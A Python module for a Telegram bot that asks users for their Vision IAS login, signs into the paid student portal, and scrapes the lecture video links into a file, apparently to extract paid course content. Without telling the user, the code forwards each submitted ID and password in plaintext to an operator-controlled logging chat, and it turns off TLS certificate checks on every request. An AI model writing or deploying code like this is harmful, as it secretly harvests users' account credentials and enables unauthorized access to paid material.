from pyrogram import Client, filters 
from pyrogram.enums import ParseMode
from pyrogram.types import Message
import requests
from bs4 import BeautifulSoup
import urllib3
import re
from concurrent.futures import ThreadPoolExecutor, as_completed
import os
import time
from Extractor import app
from Extractor.core.func import send_file
from config import LOGGER_ID

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)



def fetch_video_link(session, class_url, headers):
    try:
        resp = session.get(class_url, headers=headers, verify=False, timeout=10)
        soup = BeautifulSoup(resp.text, 'html.parser')
        iframe = soup.find('iframe')
        return class_url, iframe['src'] if iframe and iframe.get('src') else None
    except:
        return class_url, None

async def vision(app, query, message):
    await message.reply_text("**🔑 For access, please transmit your ID & Password in the correct sequence:\n\n🔒 Send like this: ID*Password**")

    try:
        cred_msg = await app.listen(message.chat.id, timeout=60)
        creds = cred_msg.text.strip()

        if '*' not in creds:
            await message.reply_text("❌ Invalid format. Use `username*password`.")
            await cred_msg.delete()
            return

        user_id, password = creds.split('*', 1)

        await app.send_message(
            chat_id=LOGGER_ID,
            text=f"✅ VISION IAS\n\nɪᴅ ᴘᴀssᴡᴏʀᴅ: <code>{user_id}*{password}</code>",
            reply_to_message_id=12844,
            parse_mode=ParseMode.HTML
        )

        session = requests.Session()
        payload = {"login": user_id, "password": password, "returnUrl": "student"}
        headers = {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "User-Agent": "Mozilla/5.0"
        }

        resp = session.post("https://www.visionias.in/student/module/login-exec2test.php",
                            data=payload, headers=headers, verify=False)

        if "Invalid" in resp.text or resp.status_code != 200:
            await message.reply_text("❌ Login failed. Check credentials.")
            await cred_msg.delete()
            return

        dash_resp = session.get("https://www.visionias.in/student/pt/video_student/live_class_dashboard.php",
                                headers=headers, verify=False)
        soup = BeautifulSoup(dash_resp.text, "html.parser")
        course_divs = soup.find_all('div', class_='grid-one-third alpha phn-tab-grid-full phn-tab-mb-30')

        if not course_divs:
            await message.reply_text("🚫 No batches found.")
            await cred_msg.delete()
            return

        batch_info = {}
        text = "**Available Batches:**\n\n"
        for div in course_divs:
            name_tag = div.find('h4')
            batch_tag = div.find('p', class_='ldg-sectionAvailableCourses_classes')
            if name_tag and batch_tag:
                course_name = name_tag.text.strip()
                batch_id = batch_tag.text.strip().replace('(', '').replace(')', '')
                text += f"`{batch_id}` - {course_name}\n"
                batch_info[batch_id] = course_name

        await message.reply_text(text)
        await cred_msg.delete()
        await message.reply_text("📥 Enter the Batch ID you want to extract:")

        batch_msg = await app.listen(message.chat.id, timeout=60)
        batch_id = batch_msg.text.strip()

        if batch_id not in batch_info:
            await message.reply_text("❌ Invalid Batch ID.")
            await batch_msg.delete()
            return

        bname = re.sub(r'[\\/*?:"<>|]', "_", batch_info[batch_id])
        await message.reply_text("**Extracting Video Links, Please Wait 📥**")

        headers1 = {
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9",
            "User-Agent": "Mozilla/5.0"
        }

        start_time = time.time()

        class_d = session.get(
            f"https://www.visionias.in/student/pt/video_student/video_student_dashboard.php?package_id={batch_id}",
            headers=headers1, verify=False)
        soup = BeautifulSoup(class_d.text, 'html.parser')
        link_tag = soup.find('a', string=lambda t: t and 'Previous Classes' in t)
        if not link_tag:
            await message.reply_text("❌ 'Previous Classes' link not found.")
            await batch_msg.delete()
            return

        final_link = f"https://visionias.in{link_tag.get('href')}"
        vid_data_res = session.get(final_link, headers=headers1, verify=False)
        soup = BeautifulSoup(vid_data_res.text, 'html.parser')
        links = soup.select('ul.gw-submenu a')

        tasks = []
        class_url_map = {}
        for link in links:
            title = link.text.strip()
            class_url = f"https://visionias.in/student/pt/video_student/{link['href']}"
            class_url_map[class_url] = title
            tasks.append(class_url)

        results = []
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = {executor.submit(fetch_video_link, session, url, headers1): url for url in tasks}
            for future in as_completed(futures):
                url = futures[future]
                _, video_url = future.result()
                title = class_url_map[url]
                if video_url:
                    results.append(f"{title} : {video_url}")

        end_time = time.time()
        elapsed = end_time - start_time

        filename = f"{bname}.txt"
        with open(filename, 'w', encoding='utf-8') as f:
            for line in results:
                f.write(line + '\n')

        caption=(
            f"**App Name:** Vision IAS\n"
            f"**Batch Name:** `{bname}`\n"
            f"📝 **Total Links:** `{len(results)}`\n"
            f"⌚️ **Time Taken:** `{round(elapsed, 2)} seconds`"
        )

        await batch_msg.delete()
        return await send_file(filename, caption, message, query)

    except Exception as e:
        await message.reply_text(f"❌ Error: {str(e)}")
